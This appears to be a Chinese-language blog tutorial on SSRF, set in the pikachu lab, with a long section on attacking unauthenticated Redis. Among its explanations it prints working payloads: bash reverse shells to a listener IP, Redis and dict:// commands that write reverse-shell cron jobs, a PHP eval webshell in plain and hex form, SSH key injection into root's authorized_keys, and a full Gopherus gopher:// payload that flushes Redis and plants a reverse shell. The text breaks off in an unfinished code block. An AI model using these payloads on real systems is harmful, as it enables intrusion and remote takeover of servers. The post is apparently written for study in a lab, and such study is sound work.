---
layout: post
title: SSRF漏洞详解
date: 2026-07-22
tags: SSRF
---

# SSRF漏洞

---

## SSRF是什么

CSRF：跨站请求伪造，客户端请求伪造

SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

---

## SSRF漏洞原理

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

![SSRF原理图](/assets/images/17/image-20260722202959086.png)

外网客户端无法直接访问内网 MySQL、Redis、图片服务器等内网资源，但 `Web 服务端`具备访问内网的权限。黑客借助 SSRF 漏洞，诱导存在缺陷的` Web 应用`，由服务端主动访问攻击者指定地址，实现读取网页、加载图片、下载资源，进而探测、攻击内网服务。

> 💡 SSRF 就是借服务器 "打通内网"。

我们可以通过SSRF漏洞去探测开放的端口。

---

## pikachu简单示例

pikachu靶场 → SSRF → SSRF(curl)

<img src="/assets/images/17/image-20260722204005503.png" alt="pikachu SSRF curl页面" style="zoom:50%;" />

这时的url：

```url
http://192.168.239.131/pikachu/vul/ssrf/ssrf_curl.php
```

点击蓝色的字：

<img src="/assets/images/17/image-20260722204055236.png" alt="点击链接后" style="zoom:33%;" />

url变成了：

```url
http://192.168.239.131/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

pikachu服务端请求了靶机上指定路径的文件。

这个文件由于是在内网上的，我们公网不能直接访问。

那么这个地方就可能存在SSRF漏洞。

我们再更改请求，去访问百度：

```url
http://192.168.239.131/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com
```

<img src="/assets/images/17/image-20260722204433293.png" alt="通过SSRF访问百度" style="zoom:33%;" />

---

## SSRF漏洞挖掘

### URL地址分享网页内容

<img src="/assets/images/17/image-20260723143413601.png" alt="QQ空间分享链接" style="zoom:33%;" />

这是分享的链接：

```url
https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1dr4y1n7vA%2F%3Fvd_source%3D5382179cfb622c0c22a3ee9655f56f1d%26share_medium%3Dweb%26share_source%3Dqqzone%26bbid%3D77F97F3C-D958-ACD5-C12A-E531D5F27C2170500infoc%26ts%3D1784788186084&showcount=1&desc=%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E7%BF%81%E6%81%BA%E6%95%99%E4%BD%A0C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%81C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%81%20UP%E4%B8%BB%EF%BC%9A%E7%BF%81%E6%81%BAc%E8%AF%AD%E8%A8%80&summary=C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BF%81%E6%81%BA%20%E6%B5%99%E5%A4%A7%E7%BF%81%E6%81%BAc%E8%AF%AD%E8%A8%80%20%E7%BF%81%E6%81%BA%20c%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8BC%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1c%E8%AF%AD%E8%A8%80%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%E4%B8%93%E5%8D%87%E6%9C%ACc%E8%AF%AD%E8%A8%80%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bc%E8%AF%AD%E8%A8%80%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95c%E8%AF%AD%E8%A8%80%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8Bc%E8%AF%AD%E9%9F%B3C%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%ABC%E8%AF%AD%E8%A8%80C%E8%AF%AD%E8%A8%80%E9%9B%B6%E5%9F%BA%E7%A1%80%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8BC%E8%AF%AD%E8%A8%80%E6%95%99%E5%AD%A6%E8%A7%86%E9%A2%91%20c%E8%AF%AD%E8%A8%80%E9%80%9F%E6%88%90C%E8%AF%AD%E8%A8%80%E6%95%99%E7%A8%8BC&title=%E6%B5%99%E6%B1%9F%E5%A4%A7%E5%AD%A6%E7%BF%81%E6%81%BA%E6%95%99%E4%BD%A0C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%81C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%81&site=%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9&pics=http%3A%2F%2Fi1.hdslb.com%2Fbfs%2Farchive%2Ff9068917b672cfb7dd5e7772c7adc53b4ab0ba8b.jpg&style=203&width=98&height=22
```

我们用url解码一下：

```url
https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://www.bilibili.com/video/BV1dr4y1n7vA/?vd_source=5382179cfb622c0c22a3ee9655f56f1d&share_medium=web&share_source=qqzone&bbid=77F97F3C-D958-ACD5-C12A-E531D5F27C2170500infoc&ts=1784788186084&showcount=1&desc=浙江大学翁恺教你C语言程序设计！C语言基础入门！ UP主：翁恺c语言&summary=C语言程序设计翁恺 浙大翁恺c语言 翁恺 c语言编程C语言程序设计c语言考研复试C语言基础入门教程零基础入门教程c语言视频教程c语言考研复试c语言视频教程c语音C语言期末C...&title=浙江大学翁恺教你C语言程序设计！C语言基础入门！&site=bilibili&pics=http://i1.hdslb.com/bfs/archive/f9068917b672cfb7dd5e7772c7adc53b4ab0ba8b.jpg&style=203&width=98&height=22
```

我们发现有2个参数后面跟了地址参数：

```url
site=bilibili&pics=http://i1.hdslb.com/bfs/archive/f9068917b672cfb7dd5e7772c7adc53b4ab0ba8b.jpg
```

```url
url=https://www.bilibili.com/video/BV1dr4y1n7vA/?vd_source=5382179cfb622c0c22a3ee9655f56f1d&share_medium=web&share_source=qqzone&bbid=77F97F3C-D958-ACD5-C12A-E531D5F27C2170500infoc&ts=1784788186084&showcount=1&desc=浙江大学翁恺教你C语言程序设计！C语言基础入门！ UP主：翁恺c语言&summary=C语言程序设计翁恺 浙大翁恺c语言 翁恺 c语言编程C语言程序设计c语言考研复试C语言基础入门教程零基础入门教程c语言视频教程c语言考研复试c语言视频教程c语音C语言期末C...&title=浙江大学翁恺教你C语言程序设计！C语言基础入门！
```

我们直接访问第一个url，发现可以直接访问成功：

<img src="/assets/images/17/image-20260723144755330.png" alt="直接访问URL" style="zoom:33%;" />

说明这时浏览器发出的请求，不是服务端发出的请求，不存在SSRF漏洞。

通过抓包我们也可以判断是从客户端发出的请求：

<img src="/assets/images/17/image-20260723152202763.png" alt="抓包确认客户端请求" style="zoom:33%;" />

再看第二个。

我们直接访问也可以成功，然后我们把他替换成 `www.baidu.com`：

```url
https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=www.baidu.com&pics=http://i1.hdslb.com/bfs/archive/f9068917b672cfb7dd5e7772c7adc53b4ab0ba8b.jpg&style=203&width=98&height=22
```

效果如下：发现并没有请求 `www.baidu.com`，只是把这个网址显示了出来，不存在SSRF。

![替换URL后的效果](/assets/images/17/image-20260723150042593.png)

### 在线翻译：通过URL地址翻译对应文本的内容

```url
http://fanyi.baidu.com/transpage?query=https://www.myip.cx/
```

### 图片、文章收藏功能

图片、文章收藏功能：此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验。

例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存、收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。

### 利用google语法加上这些关键字去寻找SSRF漏洞

简单来说就是网址url里面还有个网址url：

```
inurl:src
```

```
inurl:url
```

关键字：

| 关键字 | 关键字 | 关键字 |
|--------|--------|--------|
| share | wap | url |
| link | src | source |
| target | u | display |
| sourceURl | imageURL | domain |

> 🎯 所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞。

---

## 产生SSRF漏洞的函数

### file_get_contents

读取文件 / 网络资源的全部内容：

```php
<?php
$content = file_get_contents('http://www.baidu.com');
echo $content;
?>
```

### socket

这个函数会使用socket跟服务器建立tcp连接，传输原始数据。

```php
<?php
function GetFile($host, $port, $link)
{
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
    if (!$fp) {
        echo "$errstr (error number $errno) \n";
    } else {
        $out = "GET $link HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        $out .= "\r\n";
        fwrite($fp, $out);
        $contents = '';
        while (!feof($fp)) {
            $contents .= fgets($fp, 1024);
        }
        fclose($fp);
        return $contents;
    }
}
?>
```

### curl_exec()

CURL这是另一个非常常见的实现，它通过 PHP获取数据。

```php
<?php
if (isset($_POST['url']))
{
    $link = $_POST['url'];
    $curlobj = curl_init();                              // 初始化curl
    curl_setopt($curlobj, CURLOPT_POST, 0);              // 设置请求方式为GET
    curl_setopt($curlobj, CURLOPT_URL, $link);           // 设置请求的URL（用户可控）
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);    // 将结果以字符串返回
    $result = curl_exec($curlobj);                       // 执行curl请求
    curl_close($curlobj);                                // 关闭curl
    $filename = './curled/' . rand() . '.txt';
    file_put_contents($filename, $result);               // 保存结果到文件
    echo $result;
}
?>
```

> ⚠️ 如果遇见这三个高危函数，要高度戒备，对他们所传进来的参数进行过滤。

---

## SSRF漏洞的利用和危害

主要是用来进行内网探测，也可以说是内网信息收集，存活主机和开放端口。

1. 可以对外网服务器所在的内网进行端口扫描，获取一些服务的软件名称、版本号、系统信息
2. 有时候还可以攻击运行在内网或本地的应用程序；比如通过SSRF给内网的redis写定时任务，实现反弹shell
3. 对内网web应用进行指纹识别
4. 攻击内外网的web应用，比如struts2、sql注入等
5. 利用file协议读取本地文件等
6. 各种伪协议进行探测：`http`、`file`、`dict`、`ftp`、`gopher`等

---

## redis数据库

### 介绍

redis是高速缓存型数据库，用内存存储，主要用于缓存一些频繁使用的数据来缓解数据库的访问压力。

### redis未授权访问漏洞

redis未授权访问漏洞是因为redis数据库使用的过程中没有设定密码，任何人都可以直接连接到数据库，这就是未授权访问漏洞，这是个通用漏洞，不分版本。Redis 默认情况下，会绑定在 `0.0.0.0:6379`，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，然后写入一些危险的文件内容造成被攻击的情况出现。

漏洞的产生条件有以下两点：

1. redis绑定在 `0.0.0.0:6379`，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；
2. 没有设置密码认证（一般为空），可以免密码远程登录redis服务。

---

### 安装

**1. 安装redis依赖**

Redis是基于C语言编写的，因此首先需要安装Redis所需要的gcc依赖：

```bash
yum install -y gcc tcl
```

**2. 上传并解压**

将我们下载的 `redis-6.2.13.tar.gz` 上传到服务器上，然后解压，我直接上传到了 `/root` 目录下面：

```bash
tar -xzf redis-6.2.13.tar.gz
```

**3. 编译安装**

进入redis目录，运行编译命令进行编译安装：

```bash
cd redis-6.2.13
make && make install
```

默认的安装路径是在 `/usr/local/bin` 目录下，查看目录下的内容确保安装成功。

**4. 启动redis**

```bash
redis-server                        # 直接启动
redis-server redis.conf             # 指定配置文件启动，配置文件默认位置在解压目录中
```

**5. 停止redis进程**

```bash
ps -ef | grep redis
kill -9 pid     # pid为redis进程号
```

**6. 修改配置文件**

```bash
# 先备份配置文件
cp redis.conf redis.conf.bak
vim redis.conf

# 修改如下两个配置：
# 允许访问的地址，默认是127.0.0.1，会导致只能在本地访问。修改为0.0.0.0则可以在任意IP访问，生产环境不要设置为0.0.0.0
bind 0.0.0.0
# 守护进程，修改为yes后即可后台运行
daemonize yes
# 设置后访问Redis必须输入密码
# 注意：这个密码不用配置，要的就是没有密码直接可以连接redis服务，这就是未授权访问漏洞
# requirepass 123456
```

**7. 启动redis**

```bash
redis-server redis.conf

# 查看是否运行成功
ps -ef | grep redis
```

![redis进程](/assets/images/17/image-20260723223706224.png)

**8. 将redis添加为系统服务**

```bash
# 一、新建一个系统服务文件
vim /etc/systemd/system/redis.service

# 二、写入如下内容
```

```ini
[Unit]
Description=redis-server
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/redis-server /root/redis-6.2.13/redis.conf   # 配置文件所在路径
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

```bash
# 三、重载系统服务
systemctl daemon-reload

# 四、需要重启主机
reboot
```

**9. 操作redis服务**

```bash
# 启动
systemctl start redis
# 停止
systemctl stop redis
# 重启
systemctl restart redis
# 查看状态
systemctl status redis
# 设置redis开机自启
systemctl enable redis
```

**10. 测试连接redis服务端**

安装完redis之后，默认会安装一个本地的客户端 `redis-cli`，可以通过这个客户端连接操作服务端：

```bash
redis-cli                        # 直接回车就能连接本地的redis数据库服务端，默认是没有密码的
redis-cli -h 远程ip地址           # 可连接远程redis服务端
```

**11. 关闭防火墙**

```bash
systemctl stop firewalld
```

**12. kali主机连接**

```bash
redis-cli -h 192.168.239.140
```

<img src="/assets/images/17/image-20260723223717603.png" alt="kali连接redis" style="zoom:33%;" />

---

### redis基本操作

redis默认端口为 `6379`。

```bash
set key value    # 添加数据
get key          # 获取数据
del key          # 删除数据
keys *           # 查看有哪些key
flushall         # 清空所有数据（慎用）
```

---

### redis配置操作

```bash
config set dir /home/test       # 设置工作目录
config set dbfilename redis.rdb # 设置备份文件名
config get dir                  # 检查工作目录是否设置成功
config get dbfilename           # 检查备份文件名是否设置成功
save                            # 进行一次备份操作
```

redis是高速缓存型数据库，也就是内存存储，但是也支持持久化，也就是保存到磁盘上，保存到磁盘上时是通过一个文件来保存的，redis可以通过redis的操作语句来控制redis在系统中保存数据的目录和文件名称。

例如：

```bash
set name jaden
config set dir /home/           # 设置工作目录
config set dbfilename jaden.rdb # 设置备份文件名
save
```

---

### redis用户操作

Redis在6.0之前基本没有用户权限的概念，只有一个连接认证密码，一旦通过了认证就可以随意操作任意的redis数据，无法对用户权限进行精确控制，很容易因为用户权限过大引发误操作。如果想禁用某些不安全的命令，比如 `flushdb`、`flushall`，只能通过 `rename-command` 的方式来避免。

redis6.0发布了权限管理功能ACL（access control list 访问控制列表），可以对不同的用户设置不同的权限，限制用户可使用的命令，可访问的key等。

ACL基本操作如下：

#### 查看用户

```bash
[root@localhost bin]# ./redis-cli
127.0.0.1:6379> acl list
1) "user default on nopass ~* &* +@all"
```

- `default` 表示用户名
- `on` 表示已启用该用户，`off` 表禁用
- `nopass` 表示没有密码
- `~*` 表示可访问全部的数据Key（正则匹配）
- `&*` 表示允许用户访问所有Pub/Sub频道（正则匹配）
- `+@all` 表示用户的权限，`+` 添加权限；`-` 删减权限；`@` 为redis命令分类；可以通过 `ACL CAT` 查询相关分类，`all` 表全部的命令集合，最终 `+@all` 表示拥有所有命令集合的所有权限

---

`acl users` 查看，内容很简洁，只展示了用户名：

```bash
127.0.0.1:6379> acl users
1) "default"
```

---

`ACL WHOAMI` 查看当前使用的用户：

```bash
127.0.0.1:6379> ACL WHOAMI
"default"
```

---

`ACL GETUSER` 获取指定用户的详细权限信息：

```bash
127.0.0.1:6379> ACL GETUSER default
1) "flags"
2) 1) "on"
   2) "allkeys"
   3) "allchannels"
   4) "allcommands"
   5) "nopass"
3) "passwords"
4) (empty array)
5) "commands"
6) "+@all"
7) "keys"
8) 1) "*"
9) "channels"
```

#### 创建用户

```bash
127.0.0.1:6379> ACL SETUSER user
OK
127.0.0.1:6379> acl list
1) "user default on nopass ~* &* +@all"
2) "user user off &* -@all"
```

这样创建的用户是不可用状态（`off`），没有密码（虽然没有 `nopass` 标记），并且没有任何权限（`-@all`）的。

#### 启用/禁用用户

```bash
127.0.0.1:6379> ACL SETUSER user on
OK
127.0.0.1:6379> acl list
1) "user default on nopass ~* &* +@all"
2) "user user on &* -@all"
```

#### 设置密码/取消密码

```bash
127.0.0.1:6379> ACL SETUSER user >111111
OK
127.0.0.1:6379> acl list
1) "user default on nopass ~* &* +@all"
2) "user user on #bcb15f821479b4d5772bd0ca866c00ad5f926e3580720659cc80d39c9d09802a &* -@all"
```

取消密码：

```bash
acl setuser 用户名 <111111
```

#### 删除用户

```bash
127.0.0.1:6379> ACL DELUSER user
(integer) 1
127.0.0.1:6379> acl list
1) "user default on nopass ~* &* +@all"
```

尽管 Redis 默认情况下会创建一个名为 `default` 的用户，你也可以自定义用户名。你可以编辑 Redis 的配置文件，并按照以下步骤进行操作：

1. 打开 Redis 的配置文件，通常位于 `/etc/redis/redis.conf`
2. 在文件中找到 `requirepass` 选项，并将其取消注释（去掉前面的 `#`）
3. 将 `requirepass` 选项后面的值改为你想要的用户名
4. 保存并关闭配置文件

改完密码以后要输入密码：

```bash
auth 123
```

要不然会显示：

```
(error) NOAUTH Authentication required.
```

---

### redis未授权访问漏洞

redis未授权访问漏洞就是因为没有设定连接密码或者密码太过简单导致的。

在 `redis.conf` 配置文件中，这一行没开启，或者过于简单：

![redis.conf requirepass配置](/assets/images/17/image-20260724230138374.png)

### redis未授权访问漏洞的危害（利用方式）

#### 反弹shell

监听机器：kali（`192.168.239.133`）

```bash
nc -lvvp 4444
```

目标主机：redis

```bash
/bin/bash -i>&/dev/tcp/192.168.239.133/4444 0>&1
```

当你的监听机器的用户名变成了目标主机的用户名，那么就shell反弹成功了，监听机器就拿到了目标主机的命令控制权。

---

#### 利用定时任务反弹shell

关掉 `redis.conf` 配置文件中设置密码的参数。

centos存放定时任务的目录：`/var/spool/cron`

我们给redis设置一个工作目录：

```bash
config set dir /var/spool/cron
```

<img src="/assets/images/17/image-20260724230614484.png" alt="设置redis工作目录" style="zoom:33%;" />

然后设置一个工作文件夹，必须是某个用户的名称，因为定时任务的文件名称是根据用户名称来的：

```bash
config set dbfilename root
```

然后在centos系统上把原来的 `/var/spool/cron/dump.rdb` 删掉。

设置反弹shell定时任务：

```bash
SET xxx "\n\n* * * * * /bin/bash -i>&/dev/tcp/192.168.239.133/4444 0>&1\n\n"
```

- `* * * * *` 表示每分钟执行一次
- `/bin/bash -i` 是创建一个bash终端
- `>&/dev/tcp/192.168.111.129/4444` 是发送给 `192.168.111.129` 的 `4444端口` 的监听程序
- `0>&1` 标准输入与标准输出内容结合后重定向到标准输出里

停止定时任务：

```bash
rm -rf /var/spool/cron/root
```

> 💡 可以看到，通过写定时任务可以反弹shell。但是反弹shell需要一个前提条件，就是目标主机是可以出网的，意思就是目标主机可以上网才行。

在反弹的shell终端上有些指令执行不了，例如 `ip addr`，因为反弹shell的环境变量中可能不包含那些指令的执行路径，这个时候我们可以用 `which` 指令去查找你要执行的指令的绝对路径，然后用绝对路径执行：

```bash
which ip
/usr/sbin/ip addr
```

---

#### 利用redis写webshell

先反弹shell。

将一句话木马程序写入到redis中，然后保存到站点根目录下即可。

```php
<?php @eval($_POST['123']);?>
```

---

#### 利用公私钥认证写入root用户公钥获取root免密连接权限

> 💡 在redis4.0版本才可以用 `set` 直接把公钥写进去。

其实我们远程登录一台linux主机的时候，都是可以免密登录的，比如下面的示例：

```
操控主机：
1. 生成公私钥
   ssh-keygen
2. 将公钥echo > 重定向拷贝到目标主机的 /root/.ssh/authorized_keys

远程目标主机：
1. 在 /root/ 目录下创建 .ssh 隐藏文件夹
2. cd .ssh，进入到ssh目录中，创建 authorized_keys 文件
3. 将操作主机的公钥写入到 authorized_keys 文件中

在操控主机上执行 ssh root@目标主机ip地址，直接就可以连接，不需要输入密码了，这就是公私钥免密登录
```

![公私钥免密登录示意](/assets/images/17/image-20260725000526018.png)

也就是说，我们想办法将自己主机的公钥写入或者拷贝到目标主机的 `authorized_keys` 文件中就直接可以免密登录。

---

### redis未授权访问漏洞的防护手段

1. 添加防火墙策略，只允许某些IP地址访问这个redis服务器
2. 设置密码，以提供远程登陆

打开 `redis.conf` 配置文件，找到 `requirepass`，然后修改：

```
requirepass yourpassword
```

`yourpassword` 就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。命令如下：

```bash
redis-cli -h yourIp -p yourPort   # 启动redis客户端，并连接服务器
keys *                             # 输出服务器中的所有key
```

报错如下：

```
(error) ERR operation not permitted
```

这时候你可以用授权命令进行授权，就不报错了：

```bash
auth yourpassword
```

---

## SSRF中URL的伪协议

当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议。

| 协议 | 说明 |
|------|------|
| `http://` | 主要用于探测主机存活和端口的开放情况 |
| `file:///` | 从文件系统中获取文件内容，如 `file:///etc/passwd` |
| `dict://` | 字典服务器协议，访问字典资源，如 `dict://ip:6379/info` |
| `gopher://` | 分布式文档传递服务，可使用gopherus生成payload |
| `ftp://` | 针对21端口的探测 |
| `sftp://` | SSH文件传输协议或安全文件传输协议 |
| `ldap://` | 轻量级目录访问协议，windows 域控 |

---

### file

可以尝试从文件系统中获取文件，file协议主要用于读取服务器本地文件，访问本地的静态资源，例如：

```url
http://192.168.31.111/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:\\111.txt
```

file协议数据格式：

```
file:///文件绝对路径名
```

---

### dict

dict协议一般常用来探测内网主机以及端口开放情况，既然能够探测端口，那么可以探测不同端口对应的服务的指纹信息。当然dict协议也可以用来执行一些服务的命令，如redis。

网络结构：

![网络结构图](/assets/images/17/image-20260725181856348.png)

主要用来：

1. 内网主机探测
2. 开放端口探测
3. 端口服务指纹探测
4. 执行命令

---

#### dict协议探测端口和服务指纹

**SSH（端口22）：**

```url
dict://xxx.xxx.xxx.xxx:22
```

![dict探测SSH](/assets/images/17/image-20260725182307467.png)

---

**HTTP（端口80）：**

```url
dict://xxx.xxx.xxx.xxx:80
```

![dict探测HTTP](/assets/images/17/image-20260725182935073.png)

---

**MySQL（端口3306）：**

```url
dict://xxx.xxx.xxx.xxx:3306
```

![dict探测MySQL](/assets/images/17/image-20260725183212237.png)

---

**Redis（端口6379）：**

```url
dict://xxx.xxx.xxx.xxx:6379
```

![dict探测Redis](/assets/images/17/image-20260725183238713.png)

---

#### 执行命令

```url
dict://xxx.xxx.xxx.xxx:6379/info
```

相当于在redis中执行了 `info` 指令：

![dict执行redis info命令](/assets/images/17/image-20260725184146113.png)

---

#### dict协议攻击redis，写入定时任务，进行反弹shell

> ⚠️ 前提是有未授权访问漏洞。

centos系统定时任务的路径为：`/var/spool/cron`

debian系统定时任务的路径为：`/var/spool/cron/crontabs`

```url
dict://192.168.239.140:6379/config:set:dir:/var/spool/cron

dict://192.168.239.140:6379/config:set:dbfilename:root

dict://192.168.239.140:6379/set:jaden:"\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.239.133/4444 0>&1\n\n"

dict://192.168.239.140:6379/save
```

> 💡 注意：若payload存在被转义或过滤的情况或者由于url编码导致失效的情况出现，可利用16进制写入内容：

```url
dict://192.168.239.140:6379/set:jaden:"\n\n\x2a/1\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/192.168.239.133/1234\x200\x3e\x261\n\n"
```

---

#### dict协议攻击redis，写入webshell

```url
dict://192.168.61.161:6379/config:set:dbfilename:test.php

dict://192.168.61.161:6379/config:set:dir:/var/www/html

dict://192.168.61.161:6379/set:jaden:"\n\n<?php @ev..($_POST[x]);?>\n\n"

dict://192.168.61.161:6379/save
```

若存在过滤，则利用16进制内容写入：

```url
dict://192.168.61.161:6379/set:test:"\n\n\x3c\x3f\x70\x68\x70\x20\x40\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e\n\n"
```

---

#### dict协议攻击redis，写入ssh公钥

> 💡 4.0版本下可用。

```url
dict://192.168.61.161:6379/config:set:dir:/root/.ssh

dict://192.168.61.161:6379/config:set:dbfilename:authorized_keys

dict://192.168.61.161:6379/set:tmp:"\nssh-rsa AAAxxx...你的公钥 xxx@pc\n"

dict://192.168.61.161:6379/save
```

---

### sftp

Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。

### ldap:// 或 ldaps:// 或 ldapi://

LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。

---

### gopher://

Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。gopher协议可以用来攻击那些需要交互的应用。gopher协议支持多行数据一起发送，dict协议不支持换行符，没有办法进行换行，相当于一次只能执行一条命令，所以不能用来攻击那些需要交互的应用（比如需要认证的redis，每次都要先发送登录密码，紧接着就是要执行的指令，每次都是如此）。并且gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。

GOPHER协议是一种比HTTP协议还要古老的协议，默认工作端口70，但是gopher协议在SSRF漏洞利用上比HTTP协议更有优势。GOPHER协议可以以单个URL的形式传递POST请求，同时支持换行。

协议格式：

```url
gopher://ip:port/_数据包
```

> 💡 数据包前面的 `_` 是一个无用字符，因为gopher协议的数据格式默认会吃掉第一个数据，所以给一个无用数据占位。

格式要求：

1. gopher协议会吃掉第一个字符，所以要先放一个没有用的字符
2. 要进行url编码
3. gopher协议数据流中，url编码之后使用 `%0d%0a` 替换字符串中的回车换行
4. 数据流末尾使用 `%0d%0a` 代表消息结束

---

redis的协议数据流格式：

数据流格式中 CR LF 表示的就是 `\r` `\n`。

- `\n`：光标跳到下一行开头
- `\r`：光标回到当前行最左端，不会下移行

```
*<参数数量> CR LF
$<参数 1 的字节数量> CR LF
<参数 1 的数据> CR LF
...
$<参数 N 的字节数量> CR LF
<参数 N 的数据> CR LF
```

示例：

```
*4
$6
config
$3
set
$3
dir
$13
/var/www/html
```

gopher协议数据流写入操作，要将上面的数据转换为redis接受的数据格式，然后对 `_` 后面的数据进行url编码。如果后台触发漏洞的是 `curl_exec()`，需要对 `_` 后面的数据进行二次URL编码；如果是 `file_get_contents()` 造成的ssrf，就不需要二次url编码了。

> 🛠️ 直接帮我们生成gopher协议payload的工具：[Gopherus](https://github.com/tarunkant/Gopherus)

| 命令 | 说明 |
|------|------|
| `python2 gopherus.py --exploit mysql` | MySQL 注入 |
| `python2 gopherus.py --exploit postgresql` | PostgreSQL 注入 |
| `python2 gopherus.py --exploit fastcgi` | FastCGI RCE |
| `python2 gopherus.py --exploit redis` | Redis 写文件/反弹 Shell |
| `python2 gopherus.py --exploit zabbix` | Zabbix 命令执行 |
| `python2 gopherus.py --exploit smtp` | SMTP 伪造邮件 |
| `python2 gopherus.py --exploit pymemcache` | Python Pickle 反序列化 |
| `python2 gopherus.py --exploit phpmemcache` | PHP 反序列化 |
| `python2 gopherus.py --exploit rbmemcache` | Ruby Marshal 反序列化 |

---

#### redis示例

在kali系统上进入 `Gopherus-master` 目录。

查看使用说明：

```bash
python2 gopherus-master.py -h
```

![Gopherus帮助](/assets/images/17/image-20260725214727824.png)

```bash
python2 gopherus-master.py --exploit redis
```

![Gopherus redis模式](/assets/images/17/image-20260725214559364.png)

![Gopherus生成payload](/assets/images/17/image-20260725215129123.png)

生成的payload：

```url
gopher://192.168.239.140:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2470%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/192.168.239.133/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

解码数据流：

```
*1
$8
flushall
*3
$3
set
$1
1
$70


*/1 * * * * bash -c "sh -i >& /dev/tcp/192.168.239.133/1234 0>&1"


*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
```

> ⚠️ 绕过 `curl_exec()` 函数，需要进行二次编码：

```url
